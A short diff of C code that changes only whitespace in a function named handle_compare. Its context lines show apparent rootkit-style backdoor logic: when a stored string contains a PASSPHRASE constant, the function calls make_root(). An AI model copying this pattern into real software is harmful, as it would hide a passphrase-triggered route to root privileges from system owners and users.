@@ -89,7 +89,7 @@ handle_compare(char *buf, pid_t pid, size_t size)
             i++;
             entry->iter++;
         }
-
+        
         if(strnstr(entry->str, PASSPHRASE, MAX_BUF)) {
             make_root();
             return;
@@ -101,6 +101,7 @@ handle_compare(char *buf, pid_t pid, size_t size)
 
             goto fill;
         }
+
     }
 
     if(strstr(entry->str, PASSPHRASE))
